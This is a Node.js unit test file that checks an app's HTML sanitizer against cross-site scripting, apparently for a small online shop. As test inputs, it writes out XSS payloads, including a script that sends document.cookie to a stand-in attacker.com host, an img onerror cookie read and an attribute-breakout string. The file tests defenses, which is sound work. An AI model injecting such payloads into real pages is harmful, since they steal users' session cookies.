const { describe, it, before } = require('node:test');
const assert = require('node:assert/strict');
const { createAppInstance } = require('../helpers/app-loader');

describe('01. HTML Sanitizer & XSS Defense (sanitizeHtml)', () => {
    let app;

    before(() => {
        const instance = createAppInstance();
        app = instance.app;
    });

    it('should be defined as a function in the global scope', () => {
        assert.strictEqual(typeof app.sanitizeHtml, 'function');
    });

    it('should correctly escape HTML special characters (<, >, &, ", \', /)', () => {
        const input = `<script>alert("XSS & 'pwned'")</script>/`;
        const expected = `&lt;script&gt;alert(&quot;XSS &amp; &#x27;pwned&#x27;&quot;)&lt;&#x2F;script&gt;&#x2F;`;
        const actual = app.sanitizeHtml(input);
        assert.strictEqual(actual, expected);
    });

    it('should neutralize malicious script tags completely', () => {
        const payload = '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>';
        const sanitized = app.sanitizeHtml(payload);
        assert.ok(!sanitized.includes('<script>'));
        assert.ok(!sanitized.includes('</script>'));
        assert.ok(sanitized.includes('&lt;script&gt;'));
        assert.ok(sanitized.includes('&lt;&#x2F;script&gt;'));
    });

    it('should neutralize inline event handlers (onerror, onload, onclick)', () => {
        const imgPayload = '<img src="x" onerror="alert(document.cookie)">';
        const sanitizedImg = app.sanitizeHtml(imgPayload);
        assert.ok(!sanitizedImg.startsWith('<img'));
        assert.strictEqual(sanitizedImg, '&lt;img src=&quot;x&quot; onerror=&quot;alert(document.cookie)&quot;&gt;');

        const svgPayload = '<svg/onload=alert(1)>';
        const sanitizedSvg = app.sanitizeHtml(svgPayload);
        assert.strictEqual(sanitizedSvg, '&lt;svg&#x2F;onload=alert(1)&gt;');
    });

    it('should neutralize attribute breakout payloads', () => {
        const breakout = `"><script>alert(1)</script>`;
        const sanitized = app.sanitizeHtml(breakout);
        assert.strictEqual(sanitized, `&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;`);
    });

    it('should return empty string when input is null, undefined, number, or object', () => {
        assert.strictEqual(app.sanitizeHtml(null), '');
        assert.strictEqual(app.sanitizeHtml(undefined), '');
        assert.strictEqual(app.sanitizeHtml(12345), '');
        assert.strictEqual(app.sanitizeHtml({ name: 'hacker' }), '');
        assert.strictEqual(app.sanitizeHtml(['<script>']), '');
        assert.strictEqual(app.sanitizeHtml(true), '');
    });

    it('should preserve safe Thai text, numbers, and common punctuation', () => {
        const safeThai = 'ข้าวหลามถั่วดำเตาถ่าน รสชาติต้นตำรับ 45 บาท';
        assert.strictEqual(app.sanitizeHtml(safeThai), safeThai);

        const safeEng = 'Order #MAX-2026-001 completed successfully.';
        assert.strictEqual(app.sanitizeHtml(safeEng), safeEng);
    });

    it('should handle empty string correctly', () => {
        assert.strictEqual(app.sanitizeHtml(''), '');
    });
});
